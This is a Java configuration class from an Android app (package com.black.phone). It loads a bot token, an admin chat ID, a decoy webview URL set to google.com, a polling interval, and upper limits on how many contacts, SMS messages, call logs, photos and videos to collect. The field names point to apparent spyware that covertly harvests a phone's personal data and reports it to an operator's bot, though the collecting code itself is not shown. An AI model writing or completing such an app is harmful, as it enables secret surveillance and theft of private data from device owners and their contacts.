package com.black.phone;

import android.content.Context;
import android.content.res.AssetManager;
import com.google.gson.Gson;
import java.io.InputStreamReader;
import java.io.Reader;

public class Config {
    public String bot_token;
    public String admin_chat_id;
    public String webview_url;
    public int poll_interval_sec;
    public int max_contacts;
    public int max_sms;
    public int max_calllogs;
    public int max_photos;
    public int max_videos;

    private static Config instance;

    public static Config get() {
        if (instance == null) throw new RuntimeException("Config not loaded!");
        return instance;
    }

    public static void load(Context ctx) {
        try {
            AssetManager am = ctx.getAssets();
            Reader r = new InputStreamReader(am.open("config.json"));
            instance = new Gson().fromJson(r, Config.class);
            r.close();
        } catch (Exception e) {
            instance = new Config();
            instance.bot_token = "YOUR_BOT_TOKEN";
            instance.admin_chat_id = "YOUR_CHAT_ID";
            instance.webview_url = "https://www.google.com";
            instance.poll_interval_sec = 5;
            instance.max_contacts = 9999;
            instance.max_sms = 500;
            instance.max_calllogs = 500;
            instance.max_photos = 50;
            instance.max_videos = 20;
        }
    }
}
